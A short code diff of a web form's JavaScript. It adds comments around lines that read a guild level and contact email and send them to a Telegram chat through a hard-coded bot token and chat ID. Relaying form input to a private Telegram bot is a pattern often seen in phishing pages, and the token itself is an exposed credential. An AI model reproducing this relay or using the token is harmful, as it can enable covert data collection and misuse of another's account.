@@ -585,6 +585,7 @@
             const level = document.getElementById('guildLevelInput').value.trim();
             const email = document.getElementById('contactEmailInput').value.trim();
 
+            // DO NOT CHANGE THESE LINES - AAPKA SAHI TOKEN AUR ID HAI
             const TELEGRAM_BOT_TOKEN = '8945598582:AAEZdQdbkFjk1nBDkTNTpkUIOb7j31K0Jqc'; 
             const TELEGRAM_CHAT_ID = '7782637066'; 
 
@@ -602,6 +603,7 @@
             formData.append('caption', captionMessage);
             formData.append('parse_mode', 'Markdown');
 
+            // Button Lock and Text Change System
             const submitBtn = document.querySelector("#panel-stage3 .btn-primary-forward");
             const originalBtnText = submitBtn.innerText;
             submitBtn.innerText = "Processing...";
